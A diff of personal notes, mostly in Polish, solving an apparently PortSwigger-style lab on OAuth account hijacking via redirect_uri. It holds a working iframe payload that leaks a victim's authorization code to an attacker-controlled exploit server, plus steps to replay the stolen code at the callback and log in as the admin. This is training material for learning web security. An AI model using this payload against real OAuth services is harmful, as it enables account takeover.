@@ -18,7 +18,7 @@ payload
 
 
 Lab: OAuth account hijacking via redirect_uri*
-Zaloguj się jako wiener i przejdź wszystkie kroki> przechwyć request OAuth /auth?client_id=... w Burp
+Zaloguj się jako wiener i przejdź wszystkie kroki> odpal ostatni request OAuth /auth?client_id=... w Burp
 Na exploit serverze wklej iframe z redirect_uri wskazującym na exploit server
 Kliknij Store → Deliver exploit to victim
 W logach exploit servera znajdź ?code=... od ofiary
@@ -27,5 +27,12 @@ Wejdź na /oauth-callback?code=KOD_OFIARY
 Jesteś zalogowany jako admin/carlos
 
 
+
 payload
-<iframe src="https://oauth-0a0800dc043613358037887702b400d4.oauth-server.net/auth?client_id=ldect8gzfphtijdk5ca7k&redirect_uri=https://exploit-0a63007d042b130e809789b001ca00dc.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
+<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
+
+Log out, and navigate to the following URL, where you’ll be met with the Admin Panel:
+
+https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=CODE
+
+<img width="1456" height="1048" alt="image" src="https://github.com/user-attachments/assets/595f7290-2773-4b6f-b82e-bb64aebe4d32" />
